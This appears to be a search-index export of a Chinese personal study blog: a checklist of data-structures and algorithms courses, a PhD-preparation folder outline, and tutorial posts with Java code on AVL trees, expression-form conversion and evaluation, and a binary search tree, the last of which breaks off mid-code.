[{"categories":null,"content":" 数据结构与算法 《数据结构与算法分析——Java语言版》所有数据结构和算法实现 栈接口实现 ✅ 2025-04-11 数组栈实现 ✅ 2025-04-11 链表栈实现 ✅ 2025-04-12 括号匹配实现 ✅ 2025-04-12 中缀转后缀实现 ✅ 2025-04-12 后缀表达式求值实现 ✅ 2025-04-12 双向循环队列实现 ✅ 2025-04-12 根据课本对链表代码进行优化 ✅ 2025-04-12 第三章练习全部完成 表达式树的构造和值计算实现 ✅ 2025-04-19 二叉搜索树实现并进行测试 ✅ 2025-04-17 Average Analysis部分阅读完成 ✅ 2025-04-22 AVL树实现并进行测试 Splay树实现并进行测试 树遍历实现并进行测试 B-树实现并进行测试 TreeSet实现并进行测试 TreeMap实现并进行测试 第四章习题全部完成 15-121 Main Page (cmu.edu) Fall 2022 几个经典的search和sort算法实现 ✅ 2025-04-07 网上关于算法的内容质量真的是参差不齐，很多表述非常模糊，也没有数学推导 数据结构合集 - 快速排序(算法过程, 效率分析, 稳定性分析)_哔哩哔哩_bilibili 这个视频快排讲的很好 这个博客讲的也不错：❤️全面图解快速排序，详细图文并茂解析！❤️_快速排序图解过程-CSDN博客 学习java style guide，并运用到项目中 ✅ 2025-04-07 利用priority heap实现迪杰斯特拉算法 完成Hw6 Caltech CS 2 (debuggi.ng) 实验网址：cs2-23wi · GitLab (caltech.edu) Illionis Data Structure other semester lab CMSC Data strcture CSE 332 Spring 2023 Schedule Git仓库配置完成 ✅ 2025-03-19 Project 1 Assigned P1环境配置工作完成 ✅ 2025-03-19 Part 1完成 ✅ 2025-03-19 TrieMap \u0026 TrieSet 实现 Weiss 3.1-3.7 ✅ 2025-03-19 Slides, Ink ✅ 2025-03-19 Weiss 2.1-2.4, Math Review: Weiss 1.1-1.6 ✅ 2025-03-19 Slides, Ink, xls, More on Amortized ✅ 2025-03-19 Slides, Handout [Solution], Tries Microteach ✅ 2025-03-19 Prelim Survey Due ✅ 2025-03-19 Weiss 2.1-2.4, Math Review: Weiss 1.1-1.6 ✅ 2025-03-19 P1 Checkpoint 0 Due ✅ 2025-03-19 Weiss 6.1-6.3 Slides, Ink Weiss 6.4-6.5 Slides, Ink Slides, Handout [Solution] P1 Checkpoint 1 Due Weiss 2.1-2.4 ✅ 2025-03-19 Slides, worksheet, Ink, worksheet ink, Useful Summations \u0026 Logs Weiss 4.1-4.3, 4.6 Slides, Ink EX02 Program Analysis Due Weiss 4.4 Slides, Worksheet, Ink Slides, Handout [Solution] P1 Due Weiss 4.7 Slides, Ink, Example EX03 \u0026 EX04 Heaps Due Weiss 5.1-5.5 Slides, Ink Slides, Handout [Solution] P2 Checkpoint 1 Weiss 5.1-5.5 Slides, Ink, proof, xls Weiss 7.1-7.3, 7.5-7.7 Slides, Ink EX07 \u0026 EX08 AVL Due Weiss 7.8, 7.11 Slides, Ink Slides, Handout [Solution] Midterm exam Weiss 9.1 Slides, Ink EX09 Hashing Due Weiss 9.2 Slides, Ink, traversal examples Slides, Handout [Solution] P2 Checkpoint 2 Due Weiss 9.3 Slides, Ink Grossman 2.1-3.4 Slides, Ink EX10 Sorting Due Grossman 3.5-4.3 Slides, Ink Slides, Code [Solution] P2 Due Grossman 5.1-5.4 Slides, Ink EX11 Dijkstras Due Grossman 6 Slides, Ink Slides, Handout [Solution] P3 Checkpoint 1 Due Sat 5/20 Grossman 7.1 Slides, Ink Grossman 8, 9 EX12-15 Para Due Weiss 9.2 Slides, Ink Slides, Handout [Solution] Weiss 9.5 Slides, Ink EX16 Concurrency Due Weiss 9.6.3, 9.7 Slides, Ink P3 Due Slides, Handout [Solution], Final Review [Solution] Weiss 9.6.3, 9.7 Slides, Ink Final exam Advanced Data strcture CS 61 B sp 18 课程学完 CS 61 B Lab 5 完成 CS 61 B Lab 6 完成 CS 61 B Project 2 需求学习，进行需求分析，制定设计方案 随机迷宫算法学习并使用 Prim 算法实现一个随机迷宫，这个讲得好：C++实现迷宫生成（基于算法：随机 prim)_c++随机生成迷宫-CSDN 博客 CS 61 B Project 2 Phase 1 完成 在 Lab 6 中设置画布大小，并设置双缓冲 熟悉 TERerengine 的画布结构和两个 initialize 方法 CS 61 B Project 2 菜单栏绘制实现 CS 61 B Project 2 游戏界面绘制实现 CS 62 B Project 2 HUD 界面绘制实现 CS 61 B Project 2 用户输入感应实现 CS 61 B Project 2 鼠标悬停位置感应实现 鼠标检测实现 游戏的重新加载实现 CS 61 B Project 2 Phase 2 完成 Week 7-15 内容学习，并完成对应的 HW 和 Project Week 7 Week 8 Week 9 Week 10 Week 11 Week 12 Week 13 Week 14 Week 15 CS 61 B sp 21 课程学完 所有的 Lab Project 0 2048 Project 2 Gitlet HW 2 完成 HW 3 完成 其他 Project 把 18 的搬过去就行 其他资料复习一遍 清华大学邓俊辉 数据结构学习 MIT 6.046 算法设计与分析 MIT 6.851 高级数据结构 Introductory Data Structures and Algorithms（OCmal） 《数据结构与算法分析——C++语言版》阅读并完成所有习题 普林斯顿《算法》第四版阅读并完成所有习题 邓俊辉《数据结构与算法》 阅读并完成所有课后习题 用C++实现所有数据结构与算法 OJ刷完 C++实现各个数据结构 STL中的数据结构实现学习 小型Git实现 CS61B 其他年份的数据结构项目实现 STL实现学习 算法课程刷完 战疫时期的算法课-南京大学-2020 年春季_哔哩哔哩_bilibili Leetcode 101: Introduction to Algorithmic Thinking, Spring 2021 代码随想录 算法通关手册 CS70 UCB CS170 MIT Introduction to Algorithms 6.006 6.045: Automata, Computability, and Complexity Theory (mit.edu) MIT 6.854 Advanced Algorithms Tim Roughgarden’s Online Courses CS 161 (stanford.edu) CS 161: Design and Analysis of Algorithms (stanford.edu) Schedule | CS 161 (Archived) (stanford-cs161.github.io) CS 161 | CS 161 (Archived) (stanford-cs161.github.io) CS 161 (Archived) | Design and Analysis of ","date":"2025-05-14","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%85%AC%E5%BC%80%E8%AF%BE%E5%88%B7%E8%AF%BE%E5%88%97%E8%A1%A8/:0:0","series":["记录"],"tags":null,"title":"计算机公开课刷课列表","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%85%AC%E5%BC%80%E8%AF%BE%E5%88%B7%E8%AF%BE%E5%88%97%E8%A1%A8/#"},{"categories":null,"content":"MIT-PhD-OS/ ├── 00-战略控制塔/ │ ├── 00-作战总图.md # 总作战图:学术+财富里程碑+核心资产增长看板 │ └── 00-资产仪表盘.md # 净资产/影响力可视化 │ ├── 00-周复盘.md # 全领域聚合看板 ├── 01-学习任务库/ # 按领域拆分 │ ├── 01-公开课-Tasks.md # MIT6.S081/CSAPP等 │ ├── 02-个人项目-Tasks.md # OS/Compiler等 │ └── 03-技术武器库.md # 代码片段/性能优化技巧 │ ├── 03-开源贡献-Tasks.md # Seastar/Rust等 │ ├── 02-科研-Tasks.md # 顶会论文/开源OS │ └── 03-毕业论文-Tasks.md # 博士申请弹药库 │ ├── 02-顶会论文-Tasks.md # 论文投稿时间线 │ └── 03-实验室情报.md # 目标实验室教授论文分析 │ └── 03-内推名单.md # 高价值人脉 │ ├── 05-实习-Tasks.md # 工作日志 │ ├── 04-求职-Tasks.md # 刷题/面试 大厂/量化 │ └── 03-图形学-Tasks.md # 图形项目 ├── 04-财富系统/ # 富婆进化舱 │ ├── 01-技术变现-Tasks.md # 接单/课程 Fiverr订单/Udemy课程 接单/课程/专利 │ └── 03-人脉暗网.md # 高价值联系人追踪 │ ├── 02-投资-Tasks.md # 量化策略/加密货币 │ ├── 02-技术变现-Tasks.md # 搞钱专项 │ └── 03-创业-Tasks.md # 长期资产 校友初创合作 ├── 02-艺术与影响力/ │ ├── 01-小提琴-Tasks.md # 音乐进度 └── 02-数据源/ ├── 收入流水.csv(需要公开吗？) # 财务数据 └── 人脉名单.md(需要公开吗?) # 高价值联系人 └── 能量日志.md # 身体/心理状态监控 └── 崩溃日志.md # 心理急救 └── 复仇名单.md # 动力燃料库 ├── 健身日志.md(训记) ","date":"2025-05-14","objectID":"/mit%E5%A4%87%E6%88%98%E6%94%BB%E7%95%A5/:0:0","series":null,"tags":null,"title":"","uri":"/mit%E5%A4%87%E6%88%98%E6%94%BB%E7%95%A5/#"},{"categories":["数据结构"],"content":" 1 普通二叉搜索树的缺陷对于普通的二叉搜索树，当我们从小到大插入1到10时，因为每次都插在树的最右节点上，因此树的高度和插入的结点个数相同。那么对该树的操作，最大的时间复杂度为O(n)，最小为O(1)。因此，对于普通的搜索二叉树，一个特性是树的高度和插入的结点的大小顺序紧密相关，因此极易出现树的子树高度不均衡的情况。对树的操作又和结点的位置息息相关，因此可能出现部分操作时间复杂度较大的情况。 我们希望充分利用树的二叉结构，让树的高度为O(logN)，这样操作的时间复杂度也为O(logN)。我们无法让每颗左右子树高度相同，这样对二叉搜索树的要求太苛刻。但是我们可以让左右子树的高度差别不大于1，这就提出了平衡树的概念。下面引入AVL树。 ","date":"2025-04-25","objectID":"/avl%E6%A0%91%E5%AE%9E%E7%8E%B0/:1:0","series":null,"tags":["AVL树"],"title":"AVL树实现","uri":"/avl%E6%A0%91%E5%AE%9E%E7%8E%B0/#普通二叉搜索树的缺陷"},{"categories":["数据结构"],"content":" 2 AVL树的引进AVL树是平衡二叉树的一种，其相较于普通的二叉搜索树，其特点在于对于其内的左右子树（包括子树的左右子树）高度差不可大于1。要达成这样的效果，我们需要在对二叉树的结点进行插入和删除时增加一个操作，即\"旋转\"。 在旋转之前，我们需要找到不平衡树出现的那个根节点。其以上的树的不平衡都是由那个根节点下的左右子树导致的。下面的旋转操作均是围绕着这个出现不平衡情况的根节点实现，而不是围绕着整棵树的根节点。 如果一棵树插入节点后，成为了不平衡树，只可能是以下四种情况： 插入在左子树的左孩子； 插入在左子树的右孩子； 插入在右子树的左孩子； 插入在右子树的右孩子； 其中，情况1和4处理相似，2和3处理相似。对于情况1和4，只需要一次旋转。而对于情况2和3，需要2次旋转。 ","date":"2025-04-25","objectID":"/avl%E6%A0%91%E5%AE%9E%E7%8E%B0/:2:0","series":null,"tags":["AVL树"],"title":"AVL树实现","uri":"/avl%E6%A0%91%E5%AE%9E%E7%8E%B0/#avl树的引进"},{"categories":["数据结构"],"content":" 3 单旋转原理 根据前文，单旋转有2种情况： 新结点插入在左子树的左孩子； 新节点插入在右子树的右孩子； 这两种情况实际上是相同的，我们以第一种为例来进行分析。我们通过旋转，将左图的情况转变为右图。因为k1为不平衡树的根节点，因此我们抓住k1，摇一摇，那么k2就落了下来，Z依然是k2的右节点，X依然是k1的左节点。那么Y怎么办呢？Y的值大于k1而小于k2，因此它转变为k2的左节点。 ","date":"2025-04-25","objectID":"/avl%E6%A0%91%E5%AE%9E%E7%8E%B0/:3:0","series":null,"tags":["AVL树"],"title":"AVL树实现","uri":"/avl%E6%A0%91%E5%AE%9E%E7%8E%B0/#单旋转原理"},{"categories":["数据结构"],"content":" 4 双旋转 根据前文，双旋转有2种情况： 新节点插入在左孩子的右子树； 新节点插入在右孩子的左子树； 我们首先分析第一种方式。如果只是单旋转，旋转后如右图。我们可以看到，该树依然是不平衡的。k1是不平衡树的根。这样的单旋转只是把左图的样子做了个镜面效果罢了，归根结底是因为Y太深了。 对于Y，我们可以推测，其有一个根节点，和1-2个子节点。经过分析我们可以知道，Y的根节点的值是大于k1，小于k2的。那么我们可以把Y的根节点作为树的根节点，让k1和k2分别作为它的左右子树。又因为Y的左节点大于k1且小于Y的根节点，因此将其作为k1的右结点。同理，Y的右结点小于k2且大于Y的根节点，因此将其作为k2的左结点。 综合以上分析，我们对第一种情况进行如图的双旋转，成功解决问题（这里图中的根节点由k2替换成了k3，而k2表示Y的根节点，和上图的表示有一些区别，需要注意一下）： 下面我们分析第二种形式，也就是新节点插入在右孩子的左子树。其总体思路和第一种形式相同。如图，我们将Y抽象为一个由根节点k2和两个子节点B和C构成的二叉树（实际C不一定存在，可能为空）。那么k2大于k1且小于k3，因此让k2作为新的平衡二叉树的根节点。而B大于k1且小于k2，因此B为k1的右节点。C大于k2且小于k3，因此C为k3的左节点。旋转效果如右图所示。 ","date":"2025-04-25","objectID":"/avl%E6%A0%91%E5%AE%9E%E7%8E%B0/:4:0","series":null,"tags":["AVL树"],"title":"AVL树实现","uri":"/avl%E6%A0%91%E5%AE%9E%E7%8E%B0/#双旋转"},{"categories":["数据结构"],"content":" 5 AVLTree实现","date":"2025-04-25","objectID":"/avl%E6%A0%91%E5%AE%9E%E7%8E%B0/:5:0","series":null,"tags":["AVL树"],"title":"AVL树实现","uri":"/avl%E6%A0%91%E5%AE%9E%E7%8E%B0/#avltree实现"},{"categories":["数据结构"],"content":" 5.1 BinarySearchTree 的扩展","date":"2025-04-25","objectID":"/avl%E6%A0%91%E5%AE%9E%E7%8E%B0/:5:1","series":null,"tags":["AVL树"],"title":"AVL树实现","uri":"/avl%E6%A0%91%E5%AE%9E%E7%8E%B0/#binarysearchtree-的扩展"},{"categories":["数据结构"],"content":" 5.2 新的Node类","date":"2025-04-25","objectID":"/avl%E6%A0%91%E5%AE%9E%E7%8E%B0/:5:2","series":null,"tags":["AVL树"],"title":"AVL树实现","uri":"/avl%E6%A0%91%E5%AE%9E%E7%8E%B0/#新的node类"},{"categories":["数据结构"],"content":" 5.3 重载方法","date":"2025-04-25","objectID":"/avl%E6%A0%91%E5%AE%9E%E7%8E%B0/:5:3","series":null,"tags":["AVL树"],"title":"AVL树实现","uri":"/avl%E6%A0%91%E5%AE%9E%E7%8E%B0/#重载方法"},{"categories":["数据结构"],"content":" 6 insert方法重载","date":"2025-04-25","objectID":"/avl%E6%A0%91%E5%AE%9E%E7%8E%B0/:6:0","series":null,"tags":["AVL树"],"title":"AVL树实现","uri":"/avl%E6%A0%91%E5%AE%9E%E7%8E%B0/#insert方法重载"},{"categories":["数据结构"],"content":" 7 remove方法重载","date":"2025-04-25","objectID":"/avl%E6%A0%91%E5%AE%9E%E7%8E%B0/:7:0","series":null,"tags":["AVL树"],"title":"AVL树实现","uri":"/avl%E6%A0%91%E5%AE%9E%E7%8E%B0/#remove方法重载"},{"categories":["数据结构"],"content":" 8 完整实现","date":"2025-04-25","objectID":"/avl%E6%A0%91%E5%AE%9E%E7%8E%B0/:8:0","series":null,"tags":["AVL树"],"title":"AVL树实现","uri":"/avl%E6%A0%91%E5%AE%9E%E7%8E%B0/#完整实现"},{"categories":["数据结构"],"content":"表达式主要有3种形式：前缀表达式、中缀表达式和后缀表达式，其转换依赖于栈和树等数据结构。三种不同形式的表达式写法如下： 中缀：2 + 3 后缀：2 3 + 前缀：+ 2 3 ","date":"2025-04-25","objectID":"/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%BD%A2%E5%BC%8F%E8%BD%AC%E6%8D%A2%E4%B8%8E%E6%B1%82%E5%80%BC/:0:0","series":null,"tags":["表达式转换"],"title":"表达式形式转换与求值","uri":"/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%BD%A2%E5%BC%8F%E8%BD%AC%E6%8D%A2%E4%B8%8E%E6%B1%82%E5%80%BC/#"},{"categories":["数据结构"],"content":" 1 后缀表达式转中缀表达式后缀表达式转中缀表达式主要依赖于树的结构，具体过程分为2步： 根据后缀表达式，构造表达式树； 对表达式树进行中序遍历，在遍历时给对应位置加上括号，生成中缀表达式； 首先我们来看第一个部分。在这个过程中，主要利用了一个栈，在栈上一步步生成表达式树。算法如下： 初始化一个空栈（其元素为结点，每个结点有一个char类型数据，用于保存运算符或者操作数，还有左右子树两个域）； 对于后缀表达式中的每个字符，根据其性质进行不同操作： 如果是+ - * /等二元运算符（这里不考虑一元），从栈上弹出2个结点，将这个运算符作为一颗新树的根结点，两个结点作为这个根节点的左右子树，重新压入栈上； 如果是操作数，则将其初始化为一个新的结点，压入栈上； 将字符串处理完后，栈顶上的结点，就是根据后缀表达式生成的表达式树的根结点； 对栈使用pop()操作得到表达式树的根结点，下面对其进行中序遍历，得到中缀表达式。 注意在中序遍历的过程中，如果检测到当前子树的根结点为运算符，则在生成的表达式左右两端加上括号。此外，我们不采用简单的System.out.println，而是在中序遍历的过程中返回中序遍历的字符串。因此在遍历函数的参数中，我们需要传递之前已经得到的字符串，加上当前子树的遍历结果。对于每棵子树的中序遍历函数，expr域应该为\"\"，而不是已有的expr。因为在刚遍历子树时，还没有对子树生成任何的中序表达式，而是需要得到子树遍历生成的expr，和当前的结点值一起返回给上一级（这里非常容易写错）。 整个方法的具体实现如下： java import java.util.EmptyStackException; import java.util.Stack; public class ExprTree { private static class Node { char op; // operator or operand Node left; Node right; /** * A parameterized constructor for Node * * @param op the operand or operator field * @param left the left child of the subtree * @param right the right child of the subtree */ Node(char op, Node left, Node right) { this.op = op; this.left = left; this.right = right; } /** * A parameterized constructor for Node * * @param op the operand or operator field */ Node(char op) { this(op, null, null); } } /** * Convert a postfix expression to infix expression * * @param line a postfix expression to be converted * @return the infix expression generated from the postfix expression */ public static String postFixToInfix(String line) { // generate an expression tree of the postfix expression Stack\u003cNode\u003e s = new Stack\u003c\u003e(); int len = line.length(); for(int i = 0; i \u003c len; i++) { char c = line.charAt(i); if(c == '+' || c == '-' || c == '*' || c == '/') { Node op1, op2; try { op2 = s.pop(); op1 = s.pop(); } catch (EmptyStackException e) { System.out.println(\"The stack is empty, nothing to be popped\"); return null; } Node newNode = new Node(c, op1, op2); s.push(newNode); } else if (c == ' ') { continue; } else { Node newNode = new Node(c); s.push(newNode); } } Node tree = s.pop(); // traverse the expression tree to get the infix expression return inOrderTraverse(tree); } /** * Inorder traverse the tree to print out the infix expression * * @param root root of the tree * @return the infix expression */ public static String inOrderTraverse(Node root) { return inOrderTraverse(root, \"\"); } /** * A helper method that generate an infix expression * * @param root the current root of the expression tree to be evaluated * @param expr the previous expression * @return the new expression by traverse the current tree */ private static String inOrderTraverse(Node root, String expr) { if(root == null) { return \"\"; } // if the root contains an operator, then add brackets to its left and right boolean addBrackets = false; if(root.op == '+' || root.op == '-' || root.op == '*' || root.op == '/') { addBrackets = true; } // construct the tree by inorder traverse if(addBrackets) { expr += '('; } expr += inOrderTraverse(root.left, \"\"); expr += root.op; expr += inOrderTraverse(root.right, \"\"); if(addBrackets) { expr += ')'; } return expr; } public static void main(String[] args) { String newInfix = postFixToInfix(\" a b + c d e + * *\"); System.out.println(newInfix); } } ","date":"2025-04-25","objectID":"/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%BD%A2%E5%BC%8F%E8%BD%AC%E6%8D%A2%E4%B8%8E%E6%B1%82%E5%80%BC/:1:0","series":null,"tags":["表达式转换"],"title":"表达式形式转换与求值","uri":"/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%BD%A2%E5%BC%8F%E8%BD%AC%E6%8D%A2%E4%B8%8E%E6%B1%82%E5%80%BC/#后缀表达式转中缀表达式"},{"categories":["数据结构"],"content":" 2 中缀表达式转后缀表达式中缀表达式到后缀表达式的转换主要利用栈的结构。这里需要考虑到一个优先级的问题。 假设字符串的操作数为数字，操作符有如下几种：( ) + - * /，那么优先级从高到低顺序如下： ( ) * / + - 对于中缀表达式的处理过程是O(n)，也就是对中缀表达式过一遍，就能把后缀表达式计算出来。我们采取如下算法： 初始化一个空栈，用于存储待处理的操作符； 初始化一个空字符串，这里面就是输出的结果； 依次读取中缀表达式中的字符，按照以下几种情况分别进行处理 如果读到的是数字，那么直接将其加到输出字符串中； 如果读到的是操作符，则按照优先级次序进行如下处理： 如果读到的是+/-字符，则把栈中的除(外的所有其他字符弹出，添加到输出字符串，然后把该字符压入栈； 如果读到的是*或/字符，则把除+/-/(外的其他所有字符弹出，添加到输出字符串，然后把该字符压入栈； 如果读到的是(，则把它压入栈； 如果读到的是(，则把除(外的其他所有字符弹出并压入栈，(也弹出但是不压栈； 如果读到的是其他字符，则跳过（如空格）； 处理完中缀表达式后，把栈中残余的字符全部添加到输出字符串中； 此时输出字符串中的内容就是该中缀表达式对应的后缀表达式； 代码如下： java public static String infixToPostFix(String line) { int len = line.length(); String output = \"\"; AStack\u003cCharacter\u003e s = new AStack\u003c\u003e(len); for (int i = 0; i \u003c len; i++) { char c = line.charAt(i); if (Character.isDigit(c)) { // if it's a number, write to the output output += c; } else if (c == '+' || c == '-') { while (!s.isEmpty() \u0026\u0026 s.top() != '(') { // output the operator that has equal or higher priority except ( output += s.pop(); } // push the operator onto the stack s.push(c); } else if (c == '*' || c == '/') { char popped; while (!s.isEmpty() \u0026\u0026 ((popped = s.top()) != '+') \u0026\u0026 popped != '-' \u0026\u0026 popped != '(') { // output the operator that has equal or higher priority except ( popped = s.pop(); output += popped; } // push the operator onto the stack s.push(c); } else if (c == '(') { // push the operator onto the stack s.push(c); } else if (c == ')') { char popped; // pop the operator on the stack until encounter (, pop the ( too while (!s.isEmpty() \u0026\u0026 s.top() != '(') { popped = s.pop(); output += popped; } if (s.top() == '(') { s.pop(); } } else if (Character.isAlphabetic(c)) { System.out.println(\"Invalid character: \" + c); return null; } } // pop the left operator on the stack while (!s.isEmpty()) { output += s.pop(); } return output; } ","date":"2025-04-25","objectID":"/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%BD%A2%E5%BC%8F%E8%BD%AC%E6%8D%A2%E4%B8%8E%E6%B1%82%E5%80%BC/:2:0","series":null,"tags":["表达式转换"],"title":"表达式形式转换与求值","uri":"/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%BD%A2%E5%BC%8F%E8%BD%AC%E6%8D%A2%E4%B8%8E%E6%B1%82%E5%80%BC/#中缀表达式转后缀表达式"},{"categories":["数据结构"],"content":" 3 后缀表达式求值后缀表达式的求值操作较为简单，同样需要利用一个栈。其算法为： 如果读到的是数字，那么将其压入栈上； 如果读到的是字符串，那么从栈上弹出两个数，根据操作符计算其结果，然后压入栈上； 最后栈顶的值，就是计算的结果，弹出打印即可。 代码如下： java public static void evalExpr(String line) { int len = line.length(); AStack\u003cInteger\u003e s = new AStack\u003c\u003e(len); for (int i = 0; i \u003c len; i++) { char c = line.charAt(i); if (Character.isDigit(c)) { s.push(c - '0'); } else if (c == '+' || c == '-' || c == '*' || c == '/') { int op1 = s.pop(); int op2 = s.pop(); if (String.valueOf(op1) == null || String.valueOf(op2) == null) { System.out.println(\"Expression invalid, not enough operands\"); return; } if (c == '+') { s.push(op1 + op2); } else if (c == '-') { s.push(op1 - op2); } else if (c == '*') { s.push(op1 * op2); } else if (c == '/') { s.push(op1 / op2); } } } System.out.println(s.top()); } ","date":"2025-04-25","objectID":"/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%BD%A2%E5%BC%8F%E8%BD%AC%E6%8D%A2%E4%B8%8E%E6%B1%82%E5%80%BC/:3:0","series":null,"tags":["表达式转换"],"title":"表达式形式转换与求值","uri":"/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%BD%A2%E5%BC%8F%E8%BD%AC%E6%8D%A2%E4%B8%8E%E6%B1%82%E5%80%BC/#后缀表达式求值"},{"categories":["数据结构"],"content":" 1 设计思路二叉搜索树是二叉树中的一种，其特点是： 二叉搜索树是个递归的搜索树结构，也就是其左右两棵子树也都是二叉搜素树； 当插入节点时，对于比当前搜素树根节点小的值，插在左子树中；对于比当前搜索树根节点大的值，插在右子树中；否则不插入； 我们希望设计一棵能够存储泛型的二叉搜索树，而且这个泛型需要是可比较的，因此在实现类时，我们需要添加语句\u003cT extends Comparable\u003cT\u003e\u003e，注意该语句和public class BinarySearchTree extends Comparable\u003cT\u003e的差别在于，前者写的是该类型T是可比较的，而后者的意思是该二叉搜素树是可比较的。因此，根据前文的需求，我们采用前者的写法。 此外，前文我们提到，二叉搜索树是一个递归的结构，也就是它的左子树和右子树都是二叉搜索树，那么我们很可能做出如下的设计： java public class BinarySearchTree\u003cT extends Comparable\u003cT\u003e\u003e { private T data; private BinarySearchTree\u003cT\u003e leftChild; private BinarySearchTree\u003cT\u003e rightChild; // other methods } 该写法也是可以的，但是我们需要用this来指代该树的根，因为这里只有data leftChild rightChild三个域，对于其左右子树同理。但是如果说该树为空树怎么办呢？难道this能设置为null嘛？当然不可以，因此就没法表达什么是空树了。因此我们需要一个root变量作为树的根，对这个root为根的树进行管理。 为了解决上述问题，实现进一步的抽象，我们在BinarySearchTree的内部初始化一个Node类，这个Node类也是三个域，外带一些get和set方法： T data Node leftChild Node rightChild 那么对于BinarySearchTree，我们有一个属性，就是Node类的root。我们通过这个root来管理这棵树，当该树为空的时候，root = null；否则root就有一个T类的值。这样就合理多啦！ 此外，我们需要实现一些通用方法，其中几个非常关键的方法是： contains 判断树中是否存在某个值； findMin 找到该树的最小值（findMax同理，找到最大值）； insert 在树中插入值； remove 从树中移除值； printTree 打印树的结构； preOrderTraverse/inOrderTraverse/postOrderTraverse 前序/中序/后序遍历树； 在这其中，contains findMin printTree以及3种遍历方法比较好理解，需要重点说明的是insert和remove两种方法。 ","date":"2025-04-25","objectID":"/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E5%AE%9E%E7%8E%B0/:1:0","series":null,"tags":["二叉搜索树"],"title":"二叉搜索树实现","uri":"/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E5%AE%9E%E7%8E%B0/#设计思路"},{"categories":["数据结构"],"content":" 2 关键代码详解","date":"2025-04-25","objectID":"/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E5%AE%9E%E7%8E%B0/:2:0","series":null,"tags":["二叉搜索树"],"title":"二叉搜索树实现","uri":"/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E5%AE%9E%E7%8E%B0/#关键代码详解"},{"categories":["数据结构"],"content":" 2.1 insert实现根据二叉树的特征可知，如果该值等于当前根节点的值，则无需插入；如果比当前根节点的值小，则递归插入左子树中；否则递归插入右子树中。 我们使用public void insert(T data)来插入值，如果该根节点是null，那么直接将根节点设置为新节点；否则将新节点插入该树中。 我们使用一个private权限的helper method来辅助插入，这个方法的好处在于它将当前根节点作为参数传入，而不是最初的根节点，这样方便对子树进行处理。其核心逻辑是： 如果发现当前子树的根节点和该值相等，直接返回，无需插入； 如果发现该值小于当前子树的根节点，准备插入左子树 判断左子树是否为空，如果为空，则将当前节点左孩子设置为包含该值的节点；否则对左子树调用插入方法； 对右子树处理同上； 课本中使用了另一种方法，也就是如果递归直到发现该子树为空，则返回包含该值的节点到上一层。在上一层接受该节点，并设置左右子树。持续向上返回，直到根节点更新。这里的坏处在于需要一直向上返回，而好处在于写起来比较清晰，无需判断各种情况。 我的实现代码如下： java /** * insert the data into the binary search tree * * @param data the data to be inserted */ public void insert(T data) { if (root == null) { this.root = new Node(data); } else { insert(data, root); } } /** * A helper method that insert the data into the current binary search tree * * @param data the data to be inserted * @param currentRoot the root of the current binary search tree */ private void insert(T data, Node currentRoot) { int ret = data.compareTo(currentRoot.data); if (ret == 0) { // the data is already in the tree, do nothing, just return return; } Node newNode = new Node(data); if (ret \u003c 0) { // insert into the left subtree Node left = currentRoot.getLeftChild(); if (left == null) { currentRoot.setLeftChild(newNode); } else { insert(data, left); } } else { // insert into the right subtree Node right = currentRoot.getRightChild(); if (right == null) { currentRoot.setRightChild(newNode); } else { insert(data, right); } } } ","date":"2025-04-25","objectID":"/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E5%AE%9E%E7%8E%B0/:2:1","series":null,"tags":["二叉搜索树"],"title":"二叉搜索树实现","uri":"/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E5%AE%9E%E7%8E%B0/#insert实现"},{"categories":["数据结构"],"content":" 2.2 remove实现节点的移除需要判断如下几种情况： 该节点是叶子节点，那么直接移除即可； 该节点有左右子树。如果有左子树，可以用左子树中的最右节点替代该节点；否则的话，可以用右子树中的最左节点替代该节点； 在我的实现过程中，同样采用private的helper method的方式，该方法的返回值是当前树去掉值后的根节点。我的实现算法是： 如果该树为空，则无需移除任何节点，直接返回； 如果要移除的值比当前根节点值小，则对左子树递归调用remove方法，从左边子树移除该值，拿到移除节点后的左子树，设置为新的左子树； 如果要移除的值比当前根节点值大，则对右子树递归调用remove方法，从右边子树移除该值，拿到移除节点后的右子树，设置为新的右子树； 如果刚好根节点就是要移除的节点，我们需要再分情况讨论 如果该节点是叶子节点，则直接返回null即可。 如果左子树不为空，向下寻找左子树的最右节点，用该节点的值替换它，删除那个节点；返回删除后的左子树根； 否则寻找右子树的最左节点，用该节点的值替换它，删除那个节点；返回删除后的右子树根； 这里我的替换过程实现是one-pass，也就是在向下查找的过程中替换值并删除节点。课本中是先找到这个节点，并进行值替换，然后再调用一次方法删除这个节点。 对于我的算法，以删除左子树的最右节点为例，进行如下操作： 将该节点设置为parent，左孩子标记为rightmost。这里的parent用来标记rightmost的父节点，以便后面删除节点； 如果左孩子没有右孩子，也就是说这个左孩子已经是最右节点了，那么就直接把左孩子的左孩子设置为当前parent的左孩子； 否则向左孩子的右子树中一直向下寻找最右孩子，不断地更新rightmost和parent；最后把currentRoot的值替换为最右孩子的值，然后把这个最右孩子（rightmost）的左孩子，设置为parent的右孩子； java /** * remove the data from the binary search tree * * @param data the data to be removed */ public void remove(T data) { this.root = remove(data, root); } /** * Remove the node containing data from the current binary search tree * * @param data the data to be removed * @param currentRoot the root of the current binary search tree * @return the binary search tree after the node removed */ private Node remove(T data, Node currentRoot) { if (currentRoot == null) { // if the BST is empty, do nothing return null; } int ret = data.compareTo(currentRoot.getData()); if (ret == 0) { // judge if it's leaf Node left = currentRoot.getLeftChild(); Node right = currentRoot.getRightChild(); if ((left == null) \u0026\u0026 (right == null)) { return null; } else if (left != null) { // get the rightmost node of the left subtree Node rightmost = left; Node parent = currentRoot; if(rightmost.getRightChild() == null) { // replace the node data with that node data 